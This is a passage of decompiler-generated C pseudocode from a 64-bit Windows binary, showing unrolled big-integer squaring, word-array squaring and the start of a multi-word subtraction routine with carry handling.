  v101 = 0i64;
  if ( v100 >= v94 )
    v97 = v93;
  v102 = v97 + v99;
  v103 = v96 + 1;
  v104 = (unsigned int)a2[2];
  if ( v102 >= v97 )
    v103 = v96;
  v105 = HIDWORD(a2[2]);
  v106 = v105 * (unsigned int)v104;
  v107 = (v106 >> 31) + v105 * v105;
  v108 = (v106 << 33) + v104 * v104;
  v109 = v107 + 1;
  v110 = a2[3];
  if ( v108 >= v106 << 33 )
    v109 = v107;
  v111 = (unsigned int)v110;
  v112 = v108 + v102;
  v113 = (unsigned int)v110;
  v114 = v109 + 1;
  if ( v112 >= v108 )
    v114 = v109;
  v115 = v114 + v103;
  v116 = (unsigned int)a2[1];
  LOBYTE(v101) = v115 < v114;
  v117 = HIDWORD(v110);
  v118 = HIDWORD(a2[1]);
  v119 = v116 * v117;
  v120 = v118 * v117;
  v121 = v119 + v118 * v113;
  v122 = v120 + 0x100000000i64;
  if ( v121 >= v119 )
    v122 = v120;
  v123 = HIDWORD(v121) + v122;
  v124 = v121 << 32;
  v125 = v123 + 1;
  v126 = v124 + v116 * v111;
  if ( v126 >= v124 )
    v125 = v123;
  v127 = v126 + v112;
  v128 = v101 + 1;
  v129 = v125 + 1;
  v130 = v125 + 1;
  if ( v127 >= v126 )
    v130 = v125;
  v131 = v130 + v115;
  if ( v131 >= v130 )
    v128 = v101;
  v132 = v126 + v127;
  if ( v132 >= v126 )
    v129 = v125;
  v133 = a2[4];
  v134 = v129 + v131;
  v135 = v128 + 1;
  if ( v134 >= v129 )
    v135 = v128;
  v136 = (unsigned int)*a2;
  v137 = HIDWORD(v133);
  v138 = HIDWORD(*a2);
  v139 = v138 * HIDWORD(v133);
  v140 = v138 * (unsigned int)a2[4];
  v141 = v136 * v137;
  v142 = v139 + 0x100000000i64;
  v143 = v141 + v140;
  if ( v143 >= v141 )
    v142 = v139;
  v144 = HIDWORD(v143) + v142;
  v145 = v143 << 32;
  v146 = v144 + 1;
  v147 = v145 + v136 * (unsigned int)a2[4];
  if ( v147 >= v145 )
    v146 = v144;
  v148 = v147 + v132;
  v149 = v135 + 1;
  v150 = v146 + 1;
  v151 = v146 + 1;
  if ( v148 >= v147 )
    v151 = v146;
  v152 = v151 + v134;
  if ( v152 >= v151 )
    v149 = v135;
  v153 = v147 + v148;
  a1[4] = v153;
  if ( v153 >= v147 )
    v150 = v146;
  v154 = a2[5];
  v155 = v150 + v152;
  v156 = v149 + 1;
  if ( v155 >= v150 )
    v156 = v149;
  v157 = (unsigned int)*a2;
  v158 = HIDWORD(v154);
  v159 = HIDWORD(*a2);
  v160 = v159 * HIDWORD(v154);
  v161 = v157 * v158;
  v162 = v161 + v159 * (unsigned int)a2[5];
  v163 = v160 + 0x100000000i64;
  if ( v162 >= v161 )
    v163 = v160;
  v164 = HIDWORD(v162) + v163;
  v165 = v162 << 32;
  v166 = v164 + 1;
  v167 = v165 + v157 * (unsigned int)a2[5];
  if ( v167 >= v165 )
    v166 = v164;
  v168 = v167 + v155;
  v169 = 0i64;
  v170 = v166 + 1;
  v171 = v166 + 1;
  if ( v168 >= v167 )
    v171 = v166;
  v172 = v171 + v156;
  LOBYTE(v169) = v172 < v171;
  v173 = v167 + v168;
  if ( v173 >= v167 )
    v170 = v166;
  v174 = a2[4];
  v175 = v170 + v172;
  v176 = v169 + 1;
  if ( v175 >= v170 )
    v176 = v169;
  v177 = (unsigned int)a2[1];
  v178 = HIDWORD(v174);
  v179 = HIDWORD(a2[1]);
  v180 = v179 * (unsigned int)a2[4];
  v181 = v179 * HIDWORD(v174);
  v182 = v177 * v178;
  v183 = v181 + 0x100000000i64;
  v184 = v182 + v180;
  if ( v184 >= v182 )
    v183 = v181;
  v185 = HIDWORD(v184) + v183;
  v186 = v184 << 32;
  v187 = v185 + 1;
  v188 = v186 + v177 * (unsigned int)a2[4];
  if ( v188 >= v186 )
    v187 = v185;
  v189 = v188 + v173;
  v190 = v176 + 1;
  v191 = v187 + 1;
  v192 = v187 + 1;
  if ( v189 >= v188 )
    v192 = v187;
  v193 = v192 + v175;
  if ( v193 >= v192 )
    v190 = v176;
  v194 = v188 + v189;
  if ( v194 >= v188 )
    v191 = v187;
  v195 = v191 + v193;
  v196 = v190 + 1;
  if ( v195 >= v191 )
    v196 = v190;
  v197 = HIDWORD(a2[3]);
  v198 = (unsigned int)a2[2];
  v199 = HIDWORD(a2[2]);
  v200 = v198 * v197;
  v201 = v199 * v197;
  v202 = v200 + v199 * (unsigned int)a2[3];
  v203 = v201 + 0x100000000i64;
  if ( v202 >= v200 )
    v203 = v201;
  v204 = HIDWORD(v202) + v203;
  v205 = v202 << 32;
  v206 = v204 + 1;
  v207 = v205 + v198 * (unsigned int)a2[3];
  if ( v207 >= v205 )
    v206 = v204;
  v208 = v207 + v194;
  v209 = v196 + 1;
  v210 = v206 + 1;
  v211 = v206 + 1;
  if ( v208 >= v207 )
    v211 = v206;
  v212 = v211 + v195;
  if ( v212 >= v211 )
    v209 = v196;
  v213 = v207 + v208;
  a1[5] = v213;
  v214 = 0i64;
  if ( v213 >= v207 )
    v210 = v206;
  v215 = v210 + v212;
  v216 = v209 + 1;
  v217 = (unsigned int)a2[3];
  if ( v215 >= v210 )
    v216 = v209;
  v218 = HIDWORD(a2[3]);
  v219 = v218 * (unsigned int)v217;
  v220 = (v219 >> 31) + v218 * v218;
  v221 = (v219 << 33) + v217 * v217;
  v222 = v220 + 1;
  v223 = a2[4];
  if ( v221 >= v219 << 33 )
    v222 = v220;
  v224 = v221 + v215;
  v225 = v222 + 1;
  if ( v224 >= v221 )
    v225 = v222;
  v226 = (unsigned int)a2[2];
  v227 = v216 + v225;
  v228 = (unsigned int)v223;
  LOBYTE(v214) = v227 < v225;
  v229 = HIDWORD(a2[2]);
  v230 = v229 * (unsigned int)v223;
  v231 = HIDWORD(v223);
  v232 = v226 * v231;
  v233 = v229 * v231;
  v234 = v232 + v230;
  v235 = v233 + 0x100000000i64;
  if ( v234 >= v232 )
    v235 = v233;
  v236 = HIDWORD(v234) + v235;
  v237 = v234 << 32;
  v238 = v236 + 1;
  v239 = v237 + v226 * v228;
  if ( v239 >= v237 )
    v238 = v236;
  v240 = v239 + v224;
  v241 = v238 + 1;
  v242 = v238 + 1;
  if ( v240 >= v239 )
    v242 = v238;
  v243 = v242 + v227;
  v244 = v214 + 1;
  if ( v243 >= v242 )
    v244 = v214;
  v245 = v239 + v240;
  if ( v245 >= v239 )
    v241 = v238;
  v246 = a2[5];
  v247 = v241 + v243;
  v248 = v244 + 1;
  if ( v247 >= v241 )
    v248 = v244;
  v249 = (unsigned int)a2[1];
  v250 = HIDWORD(v246);
  v251 = HIDWORD(a2[1]);
  v252 = v251 * (unsigned int)a2[5];
  v253 = v251 * HIDWORD(v246);
  v254 = v249 * v250;
  v255 = v253 + 0x100000000i64;
  v256 = v254 + v252;
  if ( v256 >= v254 )
    v255 = v253;
  v257 = HIDWORD(v256) + v255;
  v258 = v256 << 32;
  v259 = v257 + 1;
  v260 = v258 + v249 * (unsigned int)a2[5];
  if ( v260 >= v258 )
    v259 = v257;
  v261 = v260 + v245;
  v262 = v248 + 1;
  v263 = v259 + 1;
  v264 = v259 + 1;
  if ( v261 >= v260 )
    v264 = v259;
  v265 = v264 + v247;
  if ( v265 >= v264 )
    v262 = v248;
  v266 = v260 + v261;
  if ( v266 >= v260 )
    v263 = v259;
  v267 = a2[6];
  v268 = v263 + v265;
  v269 = v262 + 1;
  if ( v268 >= v263 )
    v269 = v262;
  v270 = (unsigned int)*a2;
  v271 = HIDWORD(v267);
  v272 = HIDWORD(*a2);
  v273 = v272 * (unsigned int)a2[6];
  v274 = v272 * HIDWORD(v267);
  v275 = v270 * v271;
  v276 = v274 + 0x100000000i64;
  v277 = v275 + v273;
  if ( v277 >= v275 )
    v276 = v274;
  v278 = HIDWORD(v277) + v276;
  v279 = v277 << 32;
  v280 = v278 + 1;
  v281 = v279 + v270 * (unsigned int)a2[6];
  if ( v281 >= v279 )
    v280 = v278;
  v282 = v281 + v266;
  v283 = v280 + 1;
  v284 = v280 + 1;
  if ( v282 >= v281 )
    v284 = v280;
  v285 = v284 + v268;
  v286 = v269 + 1;
  if ( v285 >= v284 )
    v286 = v269;
  v287 = v281 + v282;
  a1[6] = v287;
  if ( v287 >= v281 )
    v283 = v280;
  v288 = a2[7];
  v289 = v283 + v285;
  v290 = v286 + 1;
  if ( v289 >= v283 )
    v290 = v286;
  v291 = (unsigned int)*a2;
  v292 = HIDWORD(v288);
  v293 = HIDWORD(*a2);
  v294 = v293 * (unsigned int)a2[7];
  v295 = v293 * HIDWORD(v288);
  v296 = v291 * v292;
  v297 = v295 + 0x100000000i64;
  v298 = v296 + v294;
  if ( v298 >= v296 )
    v297 = v295;
  v299 = HIDWORD(v298) + v297;
  v300 = v298 << 32;
  v301 = v299 + 1;
  v302 = v300 + v291 * (unsigned int)a2[7];
  if ( v302 >= v300 )
    v301 = v299;
  v303 = v302 + v289;
  v304 = 0i64;
  v305 = v301 + 1;
  v306 = v301 + 1;
  if ( v303 >= v302 )
    v306 = v301;
  LOBYTE(v304) = v306 + v290 < v306;
  v307 = v302 + v303;
  if ( v307 >= v302 )
    v305 = v301;
  v308 = a2[6];
  v309 = v305 + v306 + v290;
  v310 = v304 + 1;
  if ( v309 >= v305 )
    v310 = v304;
  v311 = (unsigned int)a2[1];
  v312 = HIDWORD(v308);
  v313 = HIDWORD(a2[1]);
  v314 = v313 * (unsigned int)a2[6];
  v315 = v313 * HIDWORD(v308);
  v316 = v311 * v312;
  v317 = v315 + 0x100000000i64;
  v318 = v316 + v314;
  if ( v318 >= v316 )
    v317 = v315;
  v319 = HIDWORD(v318) + v317;
  v320 = v318 << 32;
  v321 = v319 + 1;
  v322 = v320 + v311 * (unsigned int)a2[6];
  if ( v322 >= v320 )
    v321 = v319;
  v323 = v322 + v307;
  v324 = v321 + 1;
  v325 = v321 + 1;
  if ( v323 >= v322 )
    v325 = v321;
  v326 = v325 + v309;
  v327 = v310 + 1;
  if ( v326 >= v325 )
    v327 = v310;
  v328 = v322 + v323;
  if ( v328 >= v322 )
    v324 = v321;
  v329 = a2[5];
  v330 = v324 + v326;
  v331 = v327 + 1;
  if ( v330 >= v324 )
    v331 = v327;
  v332 = (unsigned int)a2[2];
  v333 = HIDWORD(v329);
  v334 = HIDWORD(a2[2]);
  v335 = v334 * (unsigned int)a2[5];
  v336 = v334 * HIDWORD(v329);
  v337 = v332 * v333;
  v338 = v336 + 0x100000000i64;
  v339 = v337 + v335;
  if ( v339 >= v337 )
    v338 = v336;
  v340 = HIDWORD(v339) + v338;
  v341 = v339 << 32;
  v342 = v340 + 1;
  v343 = v341 + v332 * (unsigned int)a2[5];
  if ( v343 >= v341 )
    v342 = v340;
  v344 = v343 + v328;
  v345 = v331 + 1;
  v346 = v342 + 1;
  v347 = v342 + 1;
  if ( v344 >= v343 )
    v347 = v342;
  v348 = v347 + v330;
  if ( v348 >= v347 )
    v345 = v331;
  v349 = v343 + v344;
  if ( v349 >= v343 )
    v346 = v342;
  v350 = a2[4];
  v351 = v346 + v348;
  v352 = v345 + 1;
  if ( v351 >= v346 )
    v352 = v345;
  v353 = (unsigned int)a2[3];
  v354 = HIDWORD(v350);
  v355 = HIDWORD(a2[3]);
  v356 = v355 * (unsigned int)a2[4];
  v357 = v355 * HIDWORD(v350);
  v358 = v353 * v354;
  v359 = v357 + 0x100000000i64;
  v360 = v358 + v356;
  if ( v360 >= v358 )
    v359 = v357;
  v361 = HIDWORD(v360) + v359;
  v362 = v360 << 32;
  v363 = v361 + 1;
  v364 = v362 + v353 * (unsigned int)a2[4];
  if ( v364 >= v362 )
    v363 = v361;
  v365 = v364 + v349;
  v366 = v352 + 1;
  v367 = v363 + 1;
  v368 = v363 + 1;
  if ( v365 >= v364 )
    v368 = v363;
  v369 = v368 + v351;
  if ( v369 >= v368 )
    v366 = v352;
  v370 = v364 + v365;
  a1[7] = v370;
  v371 = 0i64;
  if ( v370 >= v364 )
    v367 = v363;
  v372 = v367 + v369;
  v373 = v366 + 1;
  v374 = (unsigned int)a2[4];
  if ( v372 >= v367 )
    v373 = v366;
  v375 = HIDWORD(a2[4]);
  v376 = v375 * (unsigned int)v374;
  v377 = (v376 >> 31) + v375 * v375;
  v378 = (v376 << 33) + v374 * v374;
  v379 = v377 + 1;
  v380 = a2[5];
  if ( v378 >= v376 << 33 )
    v379 = v377;
  v381 = v378 + v372;
  v382 = v379 + 1;
  if ( v381 >= v378 )
    v382 = v379;
  v383 = (unsigned int)a2[3];
  v384 = v382 + v373;
  v385 = (unsigned int)v380;
  LOBYTE(v371) = v384 < v382;
  v386 = HIDWORD(a2[3]);
  v387 = v386 * (unsigned int)v380;
  v388 = HIDWORD(v380);
  v389 = v386 * HIDWORD(v380);
  v390 = v383 * v388;
  v391 = v389 + 0x100000000i64;
  v392 = v390 + v387;
  if ( v392 >= v390 )
    v391 = v389;
  v393 = HIDWORD(v392) + v391;
  v394 = v392 << 32;
  v395 = v393 + 1;
  v396 = v394 + v383 * v385;
  if ( v396 >= v394 )
    v395 = v393;
  v397 = v396 + v381;
  v398 = v371 + 1;
  v399 = v395 + 1;
  v400 = v395 + 1;
  if ( v397 >= v396 )
    v400 = v395;
  v401 = v400 + v384;
  if ( v401 >= v400 )
    v398 = v371;
  v402 = v396 + v397;
  if ( v402 >= v396 )
    v399 = v395;
  v403 = v398 + 1;
  v404 = (unsigned int)a2[6];
  v405 = v399 + v401;
  if ( v405 >= v399 )
    v403 = v398;
  v406 = HIDWORD(a2[6]);
  v407 = (unsigned int)a2[2];
  v408 = HIDWORD(a2[2]);
  v409 = v407 * v406;
  v410 = v408 * v406;
  v411 = v408 * (unsigned int)v404;
  v412 = v410 + 0x100000000i64;
  v413 = v409 + v411;
  if ( v413 >= v409 )
    v412 = v410;
  v414 = HIDWORD(v413) + v412;
  v415 = v413 << 32;
  v416 = v414 + 1;
  v417 = v415 + v407 * v404;
  if ( v417 >= v415 )
    v416 = v414;
  v418 = v417 + v402;
  v419 = v403 + 1;
  v420 = v416 + 1;
  v421 = v416 + 1;
  if ( v418 >= v417 )
    v421 = v416;
  v422 = v421 + v405;
  if ( v422 >= v421 )
    v419 = v403;
  v423 = v417 + v418;
  if ( v423 >= v417 )
    v420 = v416;
  v424 = a2[7];
  v425 = v420 + v422;
  v426 = v419 + 1;
  if ( v425 >= v420 )
    v426 = v419;
  v427 = (unsigned int)a2[1];
  v428 = HIDWORD(v424);
  v429 = HIDWORD(a2[1]);
  v430 = v429 * HIDWORD(v424);
  v431 = v429 * (unsigned int)a2[7];
  v432 = v427 * v428;
  v433 = v430 + 0x100000000i64;
  v434 = v432 + v431;
  if ( v434 >= v432 )
    v433 = v430;
  v435 = HIDWORD(v434) + v433;
  v436 = v434 << 32;
  v437 = v435 + 1;
  v438 = v436 + v427 * (unsigned int)a2[7];
  if ( v438 >= v436 )
    v437 = v435;
  v439 = v438 + v423;
  v440 = v426 + 1;
  v441 = v437 + 1;
  v442 = v437 + 1;
  if ( v439 >= v438 )
    v442 = v437;
  v443 = v442 + v425;
  if ( v443 >= v442 )
    v440 = v426;
  v444 = v438 + v439;
  a1[8] = v444;
  if ( v444 >= v438 )
    v441 = v437;
  v445 = v440 + 1;
  v446 = (unsigned int)a2[7];
  v447 = v441 + v443;
  if ( v447 >= v441 )
    v445 = v440;
  v448 = HIDWORD(a2[7]);
  v449 = (unsigned int)a2[2];
  v450 = HIDWORD(a2[2]);
  v451 = v449 * v448;
  v452 = v450 * v448;
  v453 = v450 * (unsigned int)v446;
  v454 = v452 + 0x100000000i64;
  v455 = v451 + v453;
  if ( v455 >= v451 )
    v454 = v452;
  v456 = HIDWORD(v455) + v454;
  v457 = v455 << 32;
  v458 = v456 + 1;
  v459 = v457 + v449 * v446;
  if ( v459 >= v457 )
    v458 = v456;
  v460 = v459 + v447;
  v461 = 0i64;
  v462 = v458 + 1;
  v463 = v458 + 1;
  if ( v460 >= v459 )
    v463 = v458;
  LOBYTE(v461) = v463 + v445 < v463;
  v464 = v459 + v460;
  if ( v464 >= v459 )
    v462 = v458;
  v465 = a2[6];
  v466 = v462 + v463 + v445;
  v467 = v461 + 1;
  if ( v466 >= v462 )
    v467 = v461;
  v468 = (unsigned int)a2[3];
  v469 = HIDWORD(v465);
  v470 = HIDWORD(a2[3]);
  v471 = v470 * HIDWORD(v465);
  v472 = v470 * (unsigned int)a2[6];
  v473 = v468 * v469;
  v474 = v471 + 0x100000000i64;
  v475 = v473 + v472;
  if ( v475 >= v473 )
    v474 = v471;
  v476 = HIDWORD(v475) + v474;
  v477 = v475 << 32;
  v478 = v476 + 1;
  v479 = v477 + v468 * (unsigned int)a2[6];
  if ( v479 >= v477 )
    v478 = v476;
  v480 = v479 + v464;
  v481 = v467 + 1;
  v482 = v478 + 1;
  v483 = v478 + 1;
  if ( v480 >= v479 )
    v483 = v478;
  v484 = v483 + v466;
  if ( v484 >= v483 )
    v481 = v467;
  v485 = v479 + v480;
  if ( v485 >= v479 )
    v482 = v478;
  v486 = v481 + 1;
  v487 = (unsigned int)a2[5];
  v488 = v482 + v484;
  if ( v488 >= v482 )
    v486 = v481;
  v489 = HIDWORD(a2[5]);
  v490 = (unsigned int)a2[4];
  v491 = v490 * v489;
  v492 = HIDWORD(a2[4]);
  v493 = v492 * v489;
  v494 = v492 * (unsigned int)v487;
  v495 = v493 + 0x100000000i64;
  v496 = v491 + v494;
  v20 = v496 < v491;
  v497 = v496;
  if ( !v20 )
    v495 = v493;
  v498 = v496 << 32;
  v499 = HIDWORD(v497) + v495;
  v500 = v499 + 1;
  v501 = v498 + v490 * v487;
  if ( v501 >= v498 )
    v500 = v499;
  v502 = v501 + v485;
  v503 = v486 + 1;
  v504 = v500 + 1;
  v505 = v500 + 1;
  if ( v502 >= v501 )
    v505 = v500;
  v506 = v505 + v488;
  if ( v506 >= v505 )
    v503 = v486;
  v507 = v501 + v502;
  a1[9] = v507;
  v508 = 0i64;
  if ( v507 >= v501 )
    v504 = v500;
  v509 = v504 + v506;
  v510 = v503 + 1;
  v511 = (unsigned int)a2[5];
  if ( v509 >= v504 )
    v510 = v503;
  v512 = HIDWORD(a2[5]);
  v513 = v512 * (unsigned int)v511;
  v514 = (v513 >> 31) + v512 * v512;
  v515 = (v513 << 33) + v511 * v511;
  v516 = v514 + 1;
  v517 = a2[6];
  if ( v515 >= v513 << 33 )
    v516 = v514;
  v518 = v515 + v509;
  v519 = v516 + 1;
  if ( v518 >= v515 )
    v519 = v516;
  v520 = (unsigned int)a2[4];
  v521 = v519 + v510;
  v522 = (unsigned int)v517;
  LOBYTE(v508) = v521 < v519;
  v523 = HIDWORD(a2[4]);
  v524 = v523 * (unsigned int)v517;
  v525 = HIDWORD(v517);
  v526 = v523 * HIDWORD(v517);
  v527 = v520 * v525;
  v528 = v526 + 0x100000000i64;
  v529 = v527 + v524;
  v20 = v529 < v527;
  v530 = v529;
  if ( !v20 )
    v528 = v526;
  v531 = v529 << 32;
  v532 = HIDWORD(v530) + v528;
  v533 = v531 + v520 * v522;
  v534 = v532 + 1;
  if ( v533 >= v531 )
    v534 = v532;
  v535 = v533 + v518;
  v536 = v534 + 1;
  v537 = v508 + 1;
  v538 = v534 + 1;
  if ( v535 >= v533 )
    v538 = v534;
  v539 = v538 + v521;
  if ( v539 >= v538 )
    v537 = v508;
  v540 = v533 + v535;
  if ( v540 >= v533 )
    v536 = v534;
  v541 = a2[7];
  v542 = v536 + v539;
  v543 = v537 + 1;
  if ( v542 >= v536 )
    v543 = v537;
  v544 = (unsigned int)a2[3];
  v545 = HIDWORD(v541);
  v546 = HIDWORD(a2[3]);
  v547 = v546 * (unsigned int)a2[7];
  v548 = v546 * HIDWORD(v541);
  v549 = v544 * v545;
  v550 = v548 + 0x100000000i64;
  v551 = v549 + v547;
  v20 = v551 < v549;
  v552 = v551;
  if ( !v20 )
    v550 = v548;
  v553 = v551 << 32;
  v554 = HIDWORD(v552) + v550;
  v555 = v554 + 1;
  v556 = v553 + v544 * (unsigned int)a2[7];
  if ( v556 >= v553 )
    v555 = v554;
  v557 = v556 + v540;
  v558 = v543 + 1;
  v559 = v555 + 1;
  v560 = v555 + 1;
  if ( v557 >= v556 )
    v560 = v555;
  v561 = v560 + v542;
  if ( v561 >= v560 )
    v558 = v543;
  v562 = v556 + v557;
  a1[10] = v562;
  if ( v562 >= v556 )
    v559 = v555;
  v563 = a2[7];
  v564 = v559 + v561;
  v565 = v558 + 1;
  if ( v564 >= v559 )
    v565 = v558;
  v566 = (unsigned int)a2[4];
  v567 = HIDWORD(v563);
  v568 = HIDWORD(a2[4]);
  v569 = v568 * (unsigned int)a2[7];
  v570 = v568 * HIDWORD(v563);
  v571 = v566 * v567;
  v572 = v570 + 0x100000000i64;
  v573 = v571 + v569;
  v20 = v573 < v571;
  v574 = v573;
  if ( !v20 )
    v572 = v570;
  v575 = v573 << 32;
  v576 = HIDWORD(v574) + v572;
  v577 = v575 + v566 * (unsigned int)a2[7];
  v578 = v576 + 1;
  if ( v577 >= v575 )
    v578 = v576;
  v579 = v577 + v564;
  v580 = v578 + 1;
  v581 = v578 + 1;
  v582 = 0i64;
  if ( v579 >= v577 )
    v581 = v578;
  LOBYTE(v582) = v581 + v565 < v581;
  v583 = v577 + v579;
  if ( v583 >= v577 )
    v580 = v578;
  v584 = v580 + v581 + v565;
  v585 = v582 + 1;
  if ( v584 >= v580 )
    v585 = v582;
  v586 = HIDWORD(a2[6]);
  v587 = (unsigned int)a2[5];
  v588 = v587 * v586;
  v589 = HIDWORD(a2[5]);
  v590 = v589 * v586;
  v591 = v588 + v589 * (unsigned int)a2[6];
  v592 = v590 + 0x100000000i64;
  if ( v591 >= v588 )
    v592 = v590;
  v593 = HIDWORD(v591) + v592;
  v594 = v591 << 32;
  v595 = v593 + 1;
  v596 = v594 + v587 * (unsigned int)a2[6];
  if ( v596 >= v594 )
    v595 = v593;
  v597 = v596 + v583;
  v598 = v585 + 1;
  v599 = v595 + 1;
  v600 = v595 + 1;
  if ( v597 >= v596 )
    v600 = v595;
  v601 = v600 + v584;
  if ( v601 >= v600 )
    v598 = v585;
  v602 = v596 + v597;
  a1[11] = v602;
  v603 = 0i64;
  if ( v602 >= v596 )
    v599 = v595;
  v604 = v599 + v601;
  v605 = v598 + 1;
  v606 = (unsigned int)a2[6];
  if ( v604 >= v599 )
    v605 = v598;
  v607 = HIDWORD(a2[6]);
  v608 = v607 * (unsigned int)v606;
  v609 = (v608 << 33) + v606 * v606;
  v610 = (v608 >> 31) + v607 * v607;
  v611 = v610 + 1;
  if ( v609 >= v608 << 33 )
    v611 = v610;
  v612 = v609 + v604;
  v613 = v611 + 1;
  if ( v612 >= v609 )
    v613 = v611;
  v614 = (unsigned int)a2[5];
  v615 = v613 + v605;
  LOBYTE(v603) = v613 + v605 < v613;
  v616 = HIDWORD(a2[5]);
  v617 = v616 * (unsigned int)a2[7];
  v618 = HIDWORD(a2[7]);
  v619 = v616 * v618;
  v620 = v614 * v618;
  v621 = v619 + 0x100000000i64;
  v622 = v620 + v617;
  if ( v622 >= v620 )
    v621 = v619;
  v623 = HIDWORD(v622) + v621;
  v624 = v622 << 32;
  v625 = v623 + 1;
  v626 = v624 + v614 * (unsigned int)a2[7];
  if ( v626 >= v624 )
    v625 = v623;
  v627 = v626 + v612;
  v628 = v603 + 1;
  v629 = v625 + 1;
  v630 = v625 + 1;
  if ( v627 >= v626 )
    v630 = v625;
  v631 = v630 + v615;
  if ( v631 >= v630 )
    v628 = v603;
  v632 = v626 + v627;
  a1[12] = v632;
  if ( v632 >= v626 )
    v629 = v625;
  v633 = a2[7];
  v634 = v629 + v631;
  v635 = v628 + 1;
  if ( v634 >= v629 )
    v635 = v628;
  v636 = (unsigned int)a2[6];
  v637 = HIDWORD(v633);
  v638 = HIDWORD(a2[6]);
  v639 = v638 * (unsigned int)a2[7];
  v640 = v638 * HIDWORD(v633);
  v641 = v636 * v637;
  v642 = v640 + 0x100000000i64;
  v643 = v641 + v639;
  if ( v643 >= v641 )
    v642 = v640;
  v644 = HIDWORD(v643) + v642;
  v645 = v643 << 32;
  v646 = v644 + 1;
  v647 = v645 + v636 * (unsigned int)a2[7];
  if ( v647 >= v645 )
    v646 = v644;
  v648 = v647 + v634;
  v649 = v646 + 1;
  v650 = v646 + 1;
  if ( v648 >= v647 )
    v650 = v646;
  v651 = v650 + v635;
  LOBYTE(v28) = v651 < v650;
  v652 = v647 + v648;
  a1[13] = v652;
  v653 = a2[7];
  if ( v652 >= v647 )
    v649 = v646;
  v654 = (unsigned int)v653;
  v655 = v649 + v651;
  v656 = v28 + 1;
  if ( v655 >= v649 )
    v656 = v28;
  v657 = HIDWORD(v653);
  v658 = v657 * (unsigned int)v654;
  v659 = (v658 >> 31) + v657 * v657;
  v660 = (v658 << 33) + v654 * v654;
  v661 = v659 + 1;
  if ( v660 >= v658 << 33 )
    v661 = v659;
  v662 = v660 + v655;
  a1[14] = v662;
  v663 = v661 + 1;
  if ( v662 >= v660 )
    v663 = v661;
  result = v656 + v663;
  a1[15] = result;
  return result;
}

//----- (0000000140074ED0) ----------------------------------------------------
void __fastcall sub_140074ED0(unsigned __int64 *a1, unsigned __int64 *a2, int a3)
{
  int v3; // r11d
  unsigned __int64 v5; // r9
  unsigned __int64 v6; // rax
  unsigned __int64 v7; // rdx
  unsigned __int64 v8; // r9
  unsigned __int64 v9; // r8
  unsigned __int64 v10; // rax
  unsigned __int64 v11; // r9
  unsigned __int64 v12; // rax
  unsigned __int64 v13; // rdx
  unsigned __int64 v14; // r9
  unsigned __int64 v15; // r8
  unsigned __int64 v16; // rax
  unsigned __int64 v17; // r9
  unsigned __int64 v18; // rax
  unsigned __int64 v19; // rdx
  unsigned __int64 v20; // r9
  unsigned __int64 v21; // r8
  unsigned __int64 v22; // rax
  unsigned __int64 v23; // r9
  unsigned __int64 v24; // rax
  unsigned __int64 v25; // rdx
  unsigned __int64 v26; // r9
  unsigned __int64 v27; // r8
  unsigned __int64 v28; // rax
  unsigned __int64 v29; // r9
  __int64 v30; // r8
  unsigned __int64 v31; // rax
  unsigned __int64 v32; // rdx
  unsigned __int64 v33; // r9
  unsigned __int64 v34; // r8
  unsigned __int64 v35; // rax

  v3 = a3;
  if ( a3 > 0 )
  {
    if ( (a3 & 0xFFFFFFFC) != 0 )
    {
      do
      {
        v5 = HIDWORD(*a2);
        v6 = v5 * (unsigned int)*a2;
        v7 = v6 << 33;
        v8 = (v6 >> 31) + v5 * v5;
        v9 = (v6 << 33) + (unsigned int)*a2 * (unsigned __int64)(unsigned int)*a2;
        *a1 = v9;
        v10 = v8 + 1;
        if ( v9 >= v7 )
          v10 = v8;
        a1[1] = v10;
        v11 = HIDWORD(a2[1]);
        v12 = v11 * (unsigned int)a2[1];
        v13 = v12 << 33;
        v14 = (v12 >> 31) + v11 * v11;
        v15 = (v12 << 33) + (unsigned int)a2[1] * (unsigned __int64)(unsigned int)a2[1];
        a1[2] = v15;
        v16 = v14 + 1;
        if ( v15 >= v13 )
          v16 = v14;
        a1[3] = v16;
        v17 = HIDWORD(a2[2]);
        v18 = v17 * (unsigned int)a2[2];
        v19 = v18 << 33;
        v20 = (v18 >> 31) + v17 * v17;
        v21 = (v18 << 33) + (unsigned int)a2[2] * (unsigned __int64)(unsigned int)a2[2];
        a1[4] = v21;
        v22 = v20 + 1;
        if ( v21 >= v19 )
          v22 = v20;
        a1[5] = v22;
        v23 = HIDWORD(a2[3]);
        v24 = v23 * (unsigned int)a2[3];
        v25 = v24 << 33;
        v26 = (v24 >> 31) + v23 * v23;
        v27 = (v24 << 33) + (unsigned int)a2[3] * (unsigned __int64)(unsigned int)a2[3];
        a1[6] = v27;
        v28 = v26 + 1;
        if ( v27 >= v25 )
          v28 = v26;
        a2 += 4;
        a1[7] = v28;
        v3 -= 4;
        a1 += 8;
      }
      while ( (v3 & 0xFFFFFFFC) != 0 );
    }
    for ( ; v3; --v3 )
    {
      v29 = *a2;
      a1 += 2;
      v30 = (unsigned int)*a2++;
      v29 >>= 32;
      v31 = v29 * (unsigned int)v30;
      v32 = v31 << 33;
      v33 = (v31 >> 31) + v29 * v29;
      v34 = (v31 << 33) + v30 * v30;
      *(a1 - 2) = v34;
      v35 = v33 + 1;
      if ( v34 >= v32 )
        v35 = v33;
      *(a1 - 1) = v35;
    }
  }
}

//----- (0000000140075060) ----------------------------------------------------
__int64 __fastcall sub_140075060(char *a1, char *a2, char *a3, int a4)
{
  __int64 result; // rax
  unsigned __int64 v7; // rbx
  unsigned __int64 v8; // rdi
  unsigned __int64 v9; // rbx
  unsigned __int64 v10; // rdi
  unsigned __int64 v11; // rbx
  unsigned __int64 v12; // rdi
  unsigned __int64 v13; // rbx
  unsigned __int64 v14; // rdi
  signed __int64 v15; // r8
  signed __int64 v16; // r11
  unsigned __int64 v17; // rbx
  unsigned __int64 v18; // rdi

  result = 0i64;
  if ( a4 > 0 )
  {
    for ( ; (a4 & 0xFFFFFFFC) != 0; a4 -= 4 )
    {
      v7 = *(_QWORD *)a2;
      v8 = *(_QWORD *)a3;
      *(_QWORD *)a1 = *(_QWORD *)a2 - (int)result - *(_QWORD *)a3;
      if ( v7 != v8 )
        LODWORD(result) = v7 < v8;
      v9 = *((_QWORD *)a2 + 1);
      v10 = *((_QWORD *)a3 + 1);
      *((_QWORD *)a1 + 1) = v9 - (int)result - v10;
      if ( v9 != v10 )
        LODWORD(result) = v9 < v10;
      v11 = *((_QWORD *)a2 + 2);
      v12 = *((_QWORD *)a3 + 2);
      *((_QWORD *)a1 + 2) = v11 - (int)result - v12;
      if ( v11 != v12 )
        LODWORD(result) = v11 < v12;
